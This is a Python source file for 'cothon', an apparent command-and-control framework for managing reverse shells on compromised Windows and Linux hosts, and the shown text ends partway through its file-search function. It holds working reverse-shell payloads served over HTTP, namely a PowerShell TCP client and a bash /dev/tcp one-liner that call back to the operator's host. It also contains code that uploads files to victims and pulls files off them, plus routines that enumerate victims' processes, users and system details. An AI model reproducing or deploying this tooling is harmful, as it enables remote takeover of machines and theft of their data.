# Coded by blue0x1 ( Chokri Hammedi )
import argparse
import base64
import concurrent.futures
import hashlib
import json
import logging
import os
import random
import re
import readline
import secrets
import select
import socket
import ssl
import sys
import threading
import time
import http.server
from datetime import datetime, timedelta

logging.basicConfig(
    filename="cothon_audit.log",
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)

RED = "\033[91m"
RESET = "\033[0m"
YELLOW = "\033[93m"

def _phoenix_await(sock: socket.socket, timeout: float) -> bytes:
    sock.setblocking(0)
    data = b""
    begin = time.time()
    while True:
        if data and time.time() - begin > timeout:
            break
        elif time.time() - begin > timeout * 2:
            break
        try:
            chunk = sock.recv(4096)
            if chunk:
                data += chunk
                begin = time.time()
            else:
                time.sleep(0.1)
        except BlockingIOError:
            time.sleep(0.1)
    sock.setblocking(1)
    return data

def show_help():
    print(r"""
Available Commands:
  help                               Display this help message
  shells                             List all active shells
  shell <shell_id>                   Select a shell and enter its sub-menu
  info <shell_id>                    Show extended information for the specified shell
  interact <shell_id>                Interact with a specific shell
  kill <shell_id>                    Kill a specific shell
  upload <shell_id> <local> <remote> Upload a local file to the remote path
  download <shell_id> <remote> <local> Download a remote file to the local path
  search <shell_id> <filename>       Search for a file on the remote shell
  listen <port>                      Start listening on the specified port for reverse shells
  listeners                          List all active listening ports
  connect <host> <port>              Connect to a bind shell at the specified host and port
  enum_users <shell_id>              Enumerate users on the target shell (Windows/Linux)
  set lhost <address>                Set the local host address (C2 IP) for payloads
  set hport <port>                   Set the HTTP server port
  services <shell_id>                List all active services on the target shell
  run <shell_id> <command>           Run a command on the target shell in the background
  pwd <shell_id>                     Show current working directory on the target shell
  ls <shell_id> [<path>]             List directory contents on the target shell (optional path)
  history                            Display the command history
  exit                               Exit the cothon.

Dead shells are automatically removed.
""")

class ElephantGuard:
    def __init__(self):
        self.token_file = ".cothon_token"
        self.upload_dir = "cothon_uploads"
        self.rate_limits = {}
        self.rate_limit_window = 60
        self.rate_limit_max = 15
        self.file_expiry = timedelta(hours=1)
        self.init_security()

    def init_security(self):

        os.makedirs(self.upload_dir, mode=0o700, exist_ok=True)

        if not os.path.exists(self.token_file):
            token = secrets.token_urlsafe(64)
            with open(self.token_file, "w") as f:
                f.write(token)
            os.chmod(self.token_file, 0o600)
            logging.info("Generated new auth token.")

    @property
    def secret_token(self):
        with open(self.token_file, "r") as f:
            return f.read().strip()

    def log_event(self, event):
        logging.info(event)

    def check_rate_limit(self, ip):
        now = time.time()
        if ip in self.rate_limits:
            count, first = self.rate_limits[ip]
            if now - first < self.rate_limit_window:
                if count >= self.rate_limit_max:
                    return False
                else:
                    self.rate_limits[ip] = (count + 1, first)
            else:
                self.rate_limits[ip] = (1, now)
        else:
            self.rate_limits[ip] = (1, now)
        return True

class HostingHandler(http.server.BaseHTTPRequestHandler):
    def __init__(self, *args, lhost=None, file_store=None, lock=None, **kwargs):
        self.lock = lock
        self.lhost = lhost
        self.file_store = file_store or {}
        super().__init__(*args, **kwargs)

    cfg = ElephantGuard()
    def log_message(self, format, *args):
        return

    def validate_request(self):
        client_ip = self.client_address[0]
        if not self.cfg.check_rate_limit(client_ip):
            self.cfg.log_event(f"RATE_LIMIT_BLOCK {client_ip}")
            return False
        auth_header = self.headers.get("X-Auth-Token", "")
        if not secrets.compare_digest(auth_header, self.cfg.secret_token):
            self.cfg.log_event(f"AUTH_FAIL {client_ip}")
            return False
        return True

    def sanitize_path(self, raw_path):

        if "/" in raw_path or "\\" in raw_path or ".." in raw_path:
            return None
        return os.path.join(self.cfg.upload_dir, raw_path)

    def do_GET(self):

        path_parts = self.path.strip('/').split('/')
        if len(path_parts) >= 2 and path_parts[0] in ['windows', 'linux']:
            os_type = path_parts[0]
            port_str = path_parts[1]
            if not port_str.isdigit():
                self.send_error(404, "Invalid port")
                return
            listener_port = int(port_str)

            if os_type == 'windows':
                ps_payload = f"""
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}
    $c=New-Object Net.Sockets.TCPClient('{self.lhost}',{listener_port});
    $s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};
    while(($i=$s.Read($b,0,$b.Length)) -ne 0){{
        $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);
        $sb=(iex $d 2>&1 | Out-String );
        $sb2=$sb+'PS '+(pwd).Path+'> ';
        $sbt=([text.encoding]::ASCII).GetBytes($sb2);
        $s.Write($sbt,0,$sbt.Length);$s.Flush()
    }};$c.Close()"""
                payload_bytes = ps_payload.encode()
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain')
                self.send_header('Content-Length', str(len(payload_bytes)))
                self.end_headers()
                self.wfile.write(payload_bytes)
            elif os_type == 'linux':
                bash_payload = f"bash -i >& /dev/tcp/{self.lhost}/{listener_port} 0>&1"
                payload_bytes = bash_payload.encode()
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain')
                self.send_header('Content-Length', str(len(payload_bytes)))
                self.end_headers()
                self.wfile.write(payload_bytes)
            return

        if not self.validate_request():
            self.send_error(403, "Forbidden")
            return
        if self.path.startswith('/cothon_transfer/'):
            file_id = self.path.split('/')[-1]
            if len(file_id) != 43:
                self.send_error(404, "Not Found")
                return
            file_entry = self.server.file_store.get(file_id)
            if not file_entry:
                self.send_error(404, "File Not Found")
                return

            if datetime.utcnow() > file_entry['expiry']:
                del self.server.file_store[file_id]
                self.send_error(410, "Gone")
                return
            content = file_entry['data']
            self.send_response(200)
            self.send_header('Content-Type', 'application/octet-stream')
            self.send_header('Content-Length', str(len(content)))
            self.end_headers()
            self.wfile.write(content)
        else:
            self.send_error(404, "cothon Path Not Found")

    def do_POST(self):

        if not self.validate_request():
            self.send_error(403, "Forbidden")
            return

        if self.path.startswith('/cothon_transfer/'):
            try:

                file_id = secrets.token_urlsafe(32)
                content_length = int(self.headers.get("Content-Length", 0))
                if content_length <= 0:
                    self.send_error(400, "No Content")
                    return

                file_data = self.rfile.read(content_length)
                dest = self.headers.get("X-Destination")
                safe_path = None
                if dest:
                    safe_path = self.sanitize_path(dest)
                    if not safe_path:
                        self.cfg.log_event(f"TRAVERSAL_ATTEMPT from {self.client_address[0]}: {dest}")
                        self.send_error(400, "Invalid filename")
                        return
                self.server.file_store[file_id] = {
                    'data': file_data,
                    'expiry': datetime.utcnow() + self.cfg.file_expiry,
                    'path': safe_path
                }
                if safe_path:
                    with open(safe_path, 'wb') as f:
                        f.write(file_data)
                self.send_response(200)
                self.end_headers()

            except Exception as e:
                print(f"[-] POST error: {str(e)}")
                self.cfg.log_event(f"UPLOAD_ERROR from {self.client_address[0]}: {str(e)}")
                self.send_error(500, "Internal Server Error")

                if file_id in self.server.file_store:
                    with self.lock:
                        del self.server.file_store[file_id]
        else:
            self.send_error(404, "cothon Path Not Found")

class SiegeTower:
    def __init__(self, lhost="0.0.0.0", hport=8081, use_ssl=False):
        self.cfg = ElephantGuard()
        self.shells = {}
        self.listeners = {}
        self.lock = threading.Lock()
        self.running = True
        self.active_interaction = None
        self.file_store = {}
        self.c2_ip = lhost
        self.hport = hport
        self.use_ssl = use_ssl
        self.http_server = None
        self.http_server_thread = None
        self.start_http_server()
        threading.Thread(target=self._healthcheck, daemon=True).start()
        self.command_history = []
        self.command_tracker = {}



    def start_http_server(self):
        if self.http_server is not None:
            self.http_server.shutdown()
            self.http_server.server_close()
        try:
            self.http_server = http.server.HTTPServer(
                ('0.0.0.0', self.hport),
                lambda *args: HostingHandler(*args, lhost=self.c2_ip, file_store=self.file_store, lock=self.lock)
            )
            self.http_server.file_store = self.file_store

            if self.use_ssl:
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                context.load_cert_chain("cert.pem", "key.pem")
                self.http_server.socket = context.wrap_socket(self.http_server.socket, server_side=True)
                print(f"[+] HTTPS server: https://{self.c2_ip}:{self.hport}")
            else:
                print(f"[+] HTTP server: http://{self.c2_ip}:{self.hport}")
            self.http_server.progress_callback = self.progress_
            threading.Thread(target=self.http_server.serve_forever, daemon=True).start()
        except OSError as e:
            print(f"[-] HTTP/HTTPS server failed: {e}")

    def _start_listener(self, port: int):
        with self.lock:
            if port in self.listeners:
                print(f"[-] Already listening on port {port}")
                return
        try:
            sock = socket.socket()
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(('0.0.0.0', port))
            sock.listen(5)
        except OSError as e:
            print(f"[-] Could not listen on port {port}: {e}")
            return

        def listener_thread(sock, port):
            print(f"[*] cothon active on port {port}")
            while self.running:
                try:
                    conn, addr = sock.accept()
                    threading.Thread(target=self._shell, args=(conn, addr), daemon=True).start()
                except Exception:
                    break
            sock.close()
            print(f"[*] Listener on port {port} closed.")
        thread = threading.Thread(target=listener_thread, args=(sock, port), daemon=True)
        thread.start()
        with self.lock:
            self.listeners[port] = {"thread": thread, "socket": sock}

    def _stop_listener(self, port: int):
        with self.lock:
            if port not in self.listeners:
                print(f"[-] No active listener on port {port}")
                return
            listener = self.listeners[port]
            sock = listener["socket"]

            sock.close()
            del self.listeners[port]
            print(f"[+] Listener on port {port} stopped.")

    def list_listeners(self):
        with self.lock:
            if not self.listeners:
                print("[-] No active listeners.")
                return
            print("Active listeners on ports:")
            for port in self.listeners:
                print(f" - {port}")

    def list_shells(self):
        with self.lock:
            if not self.shells:
                print("\n[-] No active shells")
                return
            columns = [
                ("ID", 6),
                ("OS", 10),
                ("User", 30),
                ("Status", 8),
                ("BG/FG", 10),
                ("Address", 23),
                ("Connected", 19)
            ]
            top_border = "┌" + "┬".join("─" * width for _, width in columns) + "┐"
            header_row = "│" + "│".join(col.center(width) for col, width in columns) + "│"
            sep_border = "├" + "┼".join("─" * width for _, width in columns) + "┤"
            bottom_border = "└" + "┴".join("─" * width for _, width in columns) + "┘"
            print()
            print(top_border)
            print(header_row)
            print(sep_border)
            for sid, shell in self.shells.items():
                user_info = shell.get('user_info', "unknown/unknown")
                is_elevated = shell.get('is_elevated', False)
                if "root" in user_info.lower() or "system" in user_info.lower():
                    row_color = RED
                elif is_elevated:
                    row_color = YELLOW
                else:
                    row_color = RESET
                row_data = [
                    str(sid),
                    shell['type'],
                    user_info,
                    "Active" if shell['active'] else "Dead",
                    "Foreground" if not shell['background'] else "Background",
                    f"{shell['address'][0]}:{shell['address'][1]}",
                    shell.get("connected_time", "")
                ]
                row_str = row_color + "│" + "│".join(val.ljust(width) for (_, width), val in zip(columns, row_data)) + "│" + RESET
                print(row_str)
            print(bottom_border)

    def connect_bind_shell(self, host: str, port: int):
        try:
            s = socket.socket()
            s.connect((host, port))
        except Exception as e:
            print(f"[-] Could not connect to {host}:{port}: {e}")
            return
        shell_id = random.randint(1000, 9999)
        shell_type = self._shell_type(s)
        connected_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        user_info, is_elevated = self._user_info(s, shell_type)
        with self.lock:
            self.shells[shell_id] = {
                'socket': s,
                'address': (host, port),
                'active': True,
                'background': False,
                'type': shell_type,
                'connected_time': connected_time,
                'user_info': user_info,
                'is_elevated': is_elevated,
                'os_version': None
            }
        print(f"[+] Connected to bind shell: ID {shell_id} ({shell_type}) at {host}:{port} \r")

    def _shell(self, conn: socket.socket, addr: tuple):
        shell_id = random.randint(1000, 9999)
        shell_type = self._shell_type(conn)
        connected_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        user_info, is_elevated = self._user_info(conn, shell_type)

        
        if shell_type == "Windows":
            conn.sendall(b"cmd /c cd\n")  
        else:
            conn.sendall(b"pwd\n")  

        
        output = ""
        end_time = time.time() + 5  
        conn.settimeout(2)
        while time.time() < end_time:
            try:
                data = conn.recv(4096).decode(errors="replace")
                if not data:
                    break
                output += data
                if shell_type == "Windows" and ">" in data:
                    break
                elif shell_type == "Linux" and ("$ " in data or "# " in data):
                    break
            except (socket.timeout, BlockingIOError):
                continue

        
        if shell_type == "Windows":
            current_dir = output.splitlines()[0].strip()
        else:
            current_dir = output.splitlines()[0].strip()

        
        with self.lock:
            self.shells[shell_id] = {
                'socket': conn,
                'address': addr,
                'active': True,
                'background': False,
                'type': shell_type,
                'connected_time': connected_time,
                'user_info': user_info,
                'is_elevated': is_elevated,
                'os_version': None,
                'current_dir': current_dir  
            }
        print(f"\n[+] New shell: ID {shell_id} ({shell_type}) from {addr} \r")
    def _shell_type(self, conn: socket.socket) -> str:
        try:
            conn.settimeout(0.5)
            try:
                while True:
                    data = conn.recv(65535)
                    if not data:
                        break
            except (socket.timeout, BlockingIOError):
                pass
            finally:
                conn.settimeout(None)
            try:
                conn.sendall(b'\n')
            except Exception as e:
                return f"Unknown (Send Error: {e})"

            linux_command = b"echo __OS__$(uname -s)__\n"
            try:
                conn.sendall(linux_command)
                linux_out =  _phoenix_await(conn, 2).strip().lower()
            except Exception:
                linux_out = b""
            if b"__os__linux" in linux_out:
                return "Linux"

            windows_command = b'cmd /c "echo __OS__%OS%__"\n'
            try:
                conn.sendall(windows_command)
                win_out =  _phoenix_await(conn, 2).strip().lower()
            except Exception:
                win_out = b""
            if b"__os__windows_nt" in win_out or b"__os__windows" or b"powershell" in win_out or b"$" in win_out:
                return "Windows"
            if linux_out and b"linux" in linux_out:
                return "Linux"
            if win_out and (b"windows" in win_out or b"microsoft" in win_out):
                return "Windows"
            return "Unknown"
        except Exception as e:
            return f"Unknown ({str(e)})"
        finally:
            try:
                conn.settimeout(None)
            except:
                pass

    def _exec_ps(self, shell_id: int):
        def _execute():
            try:
                with self.lock:
                    if shell_id not in self.shells or not self.shells[shell_id]['active']:
                        print(f"[-] Shell {shell_id} is either dead or inactive")
                        return

                    shell = self.shells[shell_id]
                    shell['command_running'] = True
                    self.command_tracker[shell_id] = time.time()
                    conn = shell['socket']
                    shell_type = shell['type']
                    conn.settimeout(30)


                if shell_type == "Windows":
                    ps_command = "cmd /c tasklist /V /FO LIST\n"
                else:
                    ps_command = "ps aux -ww\n"


                conn.sendall(ps_command.encode())


                hb_thread = threading.Thread(target=self._send_heartbeats, args=(shell_id,), daemon=True)
                hb_thread.start()


                output = b''
                start_time = time.time()
                while time.time() - start_time < 25:
                    try:
                        chunk = conn.recv(4096)
                        if not chunk:
                            break
                        output += chunk

                        if (shell_type == "Windows" and b'>' in chunk) or \
                                (shell_type == "Linux" and b'$ ' in chunk):
                            break
                    except (socket.timeout, BlockingIOError):
                        continue


                if shell_type == "Windows":
                    self._windows_ps(output.decode('utf-8', errors='replace'))
                else:
                    self._linux_ps(output.decode('utf-8', errors='replace'))

            except Exception as e:
                print(f"[-] PS command failed: {str(e)}")
            finally:
                with self.lock:
                    if shell_id in self.shells:
                        self.shells[shell_id]['command_running'] = False
                    self.command_tracker.pop(shell_id, None)
                    try:
                        conn.settimeout(None)
                    except:
                        pass


        threading.Thread(target=_execute, daemon=True).start()
        print(f"[*] Tasked {shell_id} shell to list processes")

    def _windows_ps(self, raw_data):

        processes = []
        current_proc = {}


        SYSTEM_PROCESSES = {
            "system idle process", "system", "smss.exe", "csrss.exe",
            "wininit.exe", "services.exe", "lsass.exe", "winlogon.exe",
            "registry", "lsm.exe", "dwm.exe", "svchost.exe",
            "taskhost.exe", "conhost.exe", "spoolsv.exe", "atieclxx.exe",
            "taskeng.exe", "msmpeng.exe", "dllhost.exe", "ctfmon.exe",
            "csrss.exe", "smss.exe", "wininit.exe", "services.exe"
        }

        SYSTEM_USERS = {
            "system", "local service", "network service",
            "nt authority\\system", "nt authority\\local service",
            "nt authority\\network service"
        }

        try:

            for line in raw_data.splitlines():
                line = line.strip()

                if not line:
                    if current_proc:
                        processes.append(current_proc)
                        current_proc = {}
                    continue

                if ':' in line:
                    key, val = line.split(':', 1)
                    key = key.strip().replace(' ', '_').replace('#', 'Num')
                    current_proc[key.lower()] = val.strip()


            if current_proc:
                processes.append(current_proc)


            filtered = []
            for p in processes:
                try:
                    pid = int(p.get('pid', '0'))
                    name = p.get('image_name', '').lower()
                    user = p.get('user_name', '').lower()


                    is_system_process = (
                            name in SYSTEM_PROCESSES or
                            any(user.startswith(sys_user) for sys_user in SYSTEM_USERS) or
                            pid <= 4
                    )

                    if not is_system_process:
                        filtered.append(p)

                except Exception:
                    continue

            if not filtered:
                print(f"{YELLOW}\n[+] No userland processes detected{RESET}")
                return


            def mem_to_mb(mem_str):
                try:
                    return f"{int(mem_str.replace(',', '').replace(' K', '')) // 1024}MB"
                except:
                    return mem_str


            print(f"\n[*] Process List")
            print("-" * 100)
            print(f"{'PID':<8}{'PROCESS':<20}{'USER':<22}{'MEM':<10}{'CPU':<10}")

            for p in filtered[:25]:
                print(
                    f"{p.get('pid', '?')[:8]:<8}"
                    f"{p.get('image_name', '?')[:18]:<20}"
                    f"{self._sanitize_user(p.get('user_name', 'SYSTEM'))[:20]:<22}"
                    f"{mem_to_mb(p.get('mem_usage', '0K'))[:10]:<10}"
                    f"{p.get('cpu_time', '0:00:00')[:10]:<10}"
                )

        except Exception as e:
            print(f"{RED}\n[!] PROCESS INTEL FAILED: {str(e)}{RESET}")

    def _sanitize_user(self, user):

        return user.split('\\')[-1] if '\\' in user else user

    def _linux_ps(self, raw_data):

        print(f"\n[*] Process List")
        print("-" * 120)
        print(f"{'PID':<8}{'USER':<12}{'%CPU':<6}{'%MEM':<6}{'COMMAND':<50}")

        header_skipped = False
        threat_detected = False

        for line in raw_data.splitlines():

            if not line.strip() or line.startswith('  PID') or ']' in line:
                continue


            parts = re.split(r'\s+', line.strip(), maxsplit=10)
            if len(parts) < 11:
                continue

            pid, user, cpu, mem = parts[1], parts[0], parts[2], parts[3]
            cmd = ' '.join(parts[10:])


            if pid < "100" or cmd.startswith('['):
                continue


            alert_color = RESET
            if any(x in cmd for x in ['nc ', 'ncat ', 'socat ', 'reverse_']):
                alert_color = RED
                threat_detected = True
            elif 'python' in cmd and ('http.server' in cmd or 'socket' in cmd):
                alert_color = YELLOW
                threat_detected = True

            print(f"{pid:<8}{user[:12]:<12}{cpu:<6}{mem:<6}{alert_color}{cmd[:60]}{RESET}")

        if not threat_detected:
            print(f"{YELLOW}\n[!] Clean systems are boring. No threats detected.{RESET}")

    def _os_version(self, conn: socket.socket, shell_type: str) -> str:

        try:
            if shell_type == "Linux":
                cmd = "uname -sr\n"
                conn.settimeout(7)
                conn.sendall(cmd.encode())
                data =  _phoenix_await(conn, 7).decode(errors="replace").strip()
                conn.settimeout(None)
                return data if data else "Not detected"

            elif shell_type == "Windows":

                commands = [
                    'cmd /c ver\n',
                    'cmd /c systeminfo | findstr /B /C:"OS Name:" /C:"OS Version:"\n'
                ]
                results = []
                conn.settimeout(10)

                for cmd in commands:
                    try:
                        conn.sendall(cmd.encode())
                        block = ""
                        end_time = time.time() + 10

                        while time.time() < end_time:
                            try:
                                data = conn.recv(4096)
                                if data:
                                    decoded = data.decode(errors="replace")
                                    block += decoded
                                    if "Microsoft Windows" in decoded or "OS Name:" in decoded:
                                        break
                                else:
                                    break
                            except BlockingIOError:
                                time.sleep(0.1)

                        results.append(block.strip())

                    except socket.timeout:
                        results.append("[ERROR] Timed out while retrieving OS information.")
                        continue

                conn.settimeout(None)


                combined = "\n".join(results)
                for line in combined.splitlines():
                    if "Microsoft Windows" in line or "OS Name:" in line:
                        return line.strip()

                return "Windows (Version detection failed)"

            else:
                return "Unknown OS"

        except socket.timeout:
            return "Error: Connection timed out"
        except Exception as e:
            return f"Error: {e}"

    def upload_artifact(self, conn: socket.socket, shell_type: str, local_path: str, remote_path: str) -> bool:

        try:
            file_id = secrets.token_urlsafe(32)

            if not os.path.isfile(local_path):
                print(f"[-] Local file '{local_path}' not found.")
                return False
            with open(local_path, "rb") as f:
                file_data = f.read()

            from datetime import datetime
            expiry_time = datetime.utcnow() + self.cfg.file_expiry
            self.file_store[file_id] = {
                "data": file_data,
                "expiry": expiry_time
            }

            protocol = "https" if getattr(self, "use_ssl", False) else "http"
            upload_url = f"{protocol}://{self.c2_ip}:{self.hport}/cothon_transfer/{file_id}"
            auth_token = self.cfg.secret_token

            if shell_type == "Windows":
                ps_command = (
                    "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; "
                    f"$wc=New-Object Net.WebClient; "
                    f"$wc.Headers.Add('X-Auth-Token','{auth_token}'); "
                    f"$wc.DownloadFile('{upload_url}','{remote_path}')"
                )
                cmd = f'powershell -Command "{ps_command}"'
            else:
                cmd = (
                    f"curl -k -s -H 'X-Auth-Token: {auth_token}' '{upload_url}' -o '{remote_path}'"
                )

            conn.sendall(cmd.encode() + b"\n")
            return self._verify_transfer(conn, remote_path, shell_type)

        except Exception as e:
            print(f"[-] upload_artifact error: {e}")
            return False
        finally:
            pass

    def download_artifact(self, conn: socket.socket, shell_type: str, remote_path: str, local_path: str) -> bool:

        try:
            file_id = secrets.token_urlsafe(32)
            auth_token = self.cfg.secret_token

            protocol = "https" if getattr(self, "use_ssl", False) else "http"
            upload_url = f"{protocol}://{self.c2_ip}:{self.hport}/cothon_transfer/{file_id}"
            safe_local = os.path.basename(local_path)

            if shell_type == "Windows":
                ps_command = (
                    "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; "
                    f"Invoke-WebRequest -Uri '{upload_url}' -Method POST "
                    f"-Headers @{{'X-Auth-Token'='{auth_token}'; 'X-Destination'='{safe_local}'}} "
                    f"-Body (Get-Content -Path '{remote_path}' -Raw) "
                )
                cmd = f'powershell -Command "{ps_command}"'
            else:
                cmd = (
                    f"curl -k -s -X POST "
                    f"-H 'X-Auth-Token: {auth_token}' "
                    f"-H 'Content-Type: application/octet-stream' "
                    f"-H 'X-Destination: {safe_local}' "
                    f"--data-binary @{remote_path} '{upload_url}'"
                )
            conn.sendall(cmd.encode() + b"\n")
            time.sleep(2)
            return True
        except Exception as e:
            print(f"[-] download_artifact error: {e}")
            return False

    def _verify_transfer(self, conn: socket.socket, remote_path: str, shell_type: str) -> bool:

        try:
            if shell_type == "Windows":
                verify_cmd = f'powershell -Command "if (Test-Path \'{remote_path}\') {{echo UPLOAD_SUCCESS}} else {{echo UPLOAD_FAIL}}"'
            else:
                verify_cmd = f"test -f '{remote_path}' && echo UPLOAD_SUCCESS || echo UPLOAD_FAIL"
            conn.sendall(f"{verify_cmd}\n".encode())
            response =  _phoenix_await(conn, 5).decode(errors="replace").strip()
            return "UPLOAD_SUCCESS" in response
        except Exception as e:
            print(f"[-] Upload verification failed: {e}")
            return False


    def cmd_upload(self, cmd: str):
        parts = cmd.split(maxsplit=3)
        if len(parts) != 4:
            print("Usage: upload <shell_id> <local_path> <remote_path>")
            return
        _, sid_str, local_path, remote_path = parts
        try:
            shell_id = int(sid_str)
        except ValueError:
            print("Usage: upload <shell_id> <local_path> <remote_path>")
            return
        with self.lock:
            shell = self.shells.get(shell_id)
            if not shell:
                print(f"[-] Shell ID {shell_id} not found.")
                return
            if not shell['active']:
                print(f"[-] Shell {shell_id} is dead or inactive.")
                return
            if not shell['background'] and self.active_interaction == shell_id:
                print("[-] This shell is in the foreground. Type 'bg' inside the shell first.")
                return
        if not os.path.isfile(local_path):
            print(f"[-] Local file '{local_path}' not found.")
            return
        shell_type = shell['type']
        conn = shell['socket']
        print(f"[+] Uploading '{local_path}' to '{remote_path}' on shell {shell_id}...")
        success = self.upload_artifact(conn, shell_type, local_path, remote_path)
        if success:
            print("[+] Upload completed successfully.")
        else:
            print("[-] Upload failed or incomplete.")

    def cmd_download(self, cmd: str):
        parts = cmd.split(maxsplit=3)
        if len(parts) != 4:
            print("Usage: download <shell_id> <remote_path> <local_path>")
            return
        _, sid_str, remote_path, local_path = parts
        try:
            shell_id = int(sid_str)
        except ValueError:
            print("Usage: download <shell_id> <remote_path> <local_path>")
            return
        with self.lock:
            shell = self.shells.get(shell_id)
            if not shell:
                print(f"[-] Shell ID {shell_id} not found.")
                return
            if not shell['active']:
                print(f"[-] Shell {shell_id} is dead or inactive.")
                return
        shell_type = shell['type']
        conn = shell['socket']
        print(f"[+] Downloading '{remote_path}' to '{local_path}' from shell {shell_id}...")
        success = self.download_artifact(conn, shell_type, remote_path, local_path)
        time.sleep(1)
        if success:
            print("[+] Download completed successfully.")
        else:
            print("[-] Download failed or incomplete.")

    def _armored_wait(self, conn, timeout, get_output=False, shell_type=None, expect=None):
        start = time.time()
        buffer = b''
        markers = {
            'init': {'Windows': b'cothon_init_ok', 'Linux': b'cothon_init_ok'},
            'verify': {'Windows': b'cothon_verify_ok', 'Linux': b'cothon_verify_ok'},
            'chunk': {'Windows': b'cothon_chunk_ok', 'Linux': b'cothon_chunk_ok'},
            'md5': {'Windows': b'cothon_md5_done', 'Linux': b'cothon_md5_done'},
            'hash': {'Windows': b'cothon_md5_done', 'Linux': b'cothon_md5_done'},
            'size': {'Windows': b'cothon_size_done', 'Linux': b'cothon_size_done'},
            'keepalive': {'Windows': b'KEEPALIVE', 'Linux': b'KEEPALIVE'}
        }
        while time.time() - start < timeout:
            try:
                data = conn.recv(4096)
                if not data:
                    break
                buffer += data
                if expect and shell_type:
                    target = markers.get(expect, {}).get(shell_type)
                    if target and target in buffer:
                        if get_output:
                            return buffer.decode(errors='replace')
                        return True
                errors = [b'rror', b'xception', b'denied', b'not found']
                if any(e in buffer for e in errors):
                    print(f"\n[!] Shell error: {buffer.decode(errors='replace')}")
                    return False
                if shell_type == "Windows" and not get_output and buffer.endswith((b'PS ', b'> ')):
                    return True
            except (socket.timeout, BlockingIOError):
                continue
        if get_output:
            return buffer.decode(errors='replace').strip()
        return False

    def progress_(self, sent: int, total: int):
        percent = sent / total
        bar_length = 30
        filled_blocks = int(bar_length * percent)
        bar = f"[{'█' * filled_blocks}{'░' * (bar_length - filled_blocks)}] {percent:.1%} ({sent / 1024:.2f} KB / {total / 1024:.2f} KB)"
        sys.stdout.write(f"\r{bar}")
        sys.stdout.flush()
        if sent >= total:
            sys.stdout.flush()

    def interact_(self, shell_id: int):
        with self.lock:
            if self.active_interaction is not None and self.active_interaction != shell_id:
                print("[-] Another session is currently active. Use 'bg' to background it first.")
                return
            shell = self.shells.get(shell_id)
            if not shell:
                print(f"[-] Shell ID {shell_id} not found")
                return
            if not shell['active']:
                print(f"[-] Shell {shell_id} is Dead or closed.")
                return
            self.active_interaction = shell_id
            shell['background'] = False
            shell['keepalive_paused'] = True
            conn = shell['socket']
        print(f"[*] Interactive session with shell {shell_id} (type 'bg' to background, 'exit' to close)")
        try:
            while True:
                timeout = 0.1
                rlist, _, _ = select.select([conn, sys.stdin], [], [], timeout)
                for ready in rlist:
                    if ready == conn:
                        try:
                            data = conn.recv(4096)
                            if not data:
                                raise ConnectionError("Graceful disconnect")
                            os.write(sys.stdout.fileno(), data)
                        except ConnectionResetError:
                            self.remove_shell(shell_id, reason="connection reset")
                            return
                    else:
                        cmd_input = os.read(sys.stdin.fileno(), 4096).strip()
                        if not cmd_input:
                            try:
                                conn.sendall(b'\n')
                            except OSError as e:
                                self.remove_shell(shell_id, reason=f"send error: {str(e)}")
                                return
                            continue
                        if cmd_input in [b'bg', b'exit', b'quit']:
                            print(f"\n[*] Session {shell_id} moved to background")
                            with self.lock:
                                if shell_id in self.shells:
                                    self.shells[shell_id]['background'] = True
                                    self.shells[shell_id]['keepalive_paused'] = False
                                self.active_interaction = None
                            return
                        try:
                            if not cmd_input.endswith(b'\n'):
                                cmd_input += b'\n'
                            conn.sendall(cmd_input)
                        except OSError as e:
                            self.remove_shell(shell_id, reason=f"send error: {str(e)}")
                            return
        except Exception as e:
            self.remove_shell(shell_id, reason=f"unexpected error: {str(e)}")
        finally:
            with self.lock:
                if self.active_interaction == shell_id:
                    self.active_interaction = None
                if shell_id in self.shells:
                    self.shells[shell_id]['keepalive_paused'] = False


    def cmd_info(self, cmd: str):
        parts = cmd.split()
        if len(parts) != 2:
            print("Usage: info <shell_id>")
            return
        try:
            shell_id = int(parts[1])
        except ValueError:
            print("Usage: info <shell_id>")
            return

        with self.lock:
            shell = self.shells.get(shell_id)

        if not shell:
            print(f"Shell ID {shell_id} not found.")
            return


        if shell.get('os_version') is None:
            os_version = self._os_version(shell['socket'], shell['type'])
            with self.lock:
                self.shells[shell_id]['os_version'] = os_version
        else:
            os_version = shell['os_version']

        info_dict = {
            "Address": shell.get('address'),
            "Type": shell.get('type'),
            "Active": shell.get('active'),
            "Background": shell.get('background'),
            "Connected Time": shell.get('connected_time'),
            "User Info": shell.get('user_info'),
            "Elevated": shell.get('is_elevated'),
            "OS Version": os_version
        }

        max_key_length = max(len(key) for key in info_dict.keys())
        header = f"Shell Info: {shell_id}"
        line_width = max(len(header), max_key_length + 3 + 40)
        border = "+" + "-" * (line_width + 2) + "+"
        print("\n" + border)
        print("| " + header.ljust(line_width) + " |")
        print(border)
        for key, value in info_dict.items():
            line = f"{key.ljust(max_key_length)} : {value}"
            print("| " + line.ljust(line_width) + " |")
        print(border + "\n")

    def cmd_interact(self, cmd: str):
        parts = cmd.split()
        if len(parts) != 2:
            print("Usage: interact <shell_id>")
            return
        try:
            shell_id = int(parts[1])
        except ValueError:
            print("Usage: interact <shell_id>")
            return
        self.interact_(shell_id)

    def cmd_search(self, cmd: str):

        parts = cmd.split(maxsplit=2)
        if len(parts) != 3:
            print("Usage: search <shell_id> <filename>")
            return
        try:
            shell_id = int(parts[1])
        except ValueError:
            print("Usage: search <shell_id> <filename>")
            return
        filename = parts[2]

        with self.lock:
            shell = self.shells.get(shell_id)
        if not shell:
            print(f"Shell ID {shell_id} not found.")
            return

        shell_type = shell['type']
        conn = shell['socket']

        if shell_type == "Linux":
            search_cmd = f"find / -name '{filename}' 2>/dev/null; echo [SEARCH_DONE]\n"
        elif shell_type == "Windows":

            powershell_script = f"""
                $results = Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Where-Object {{ $_.Name -like '*{filename}' }}
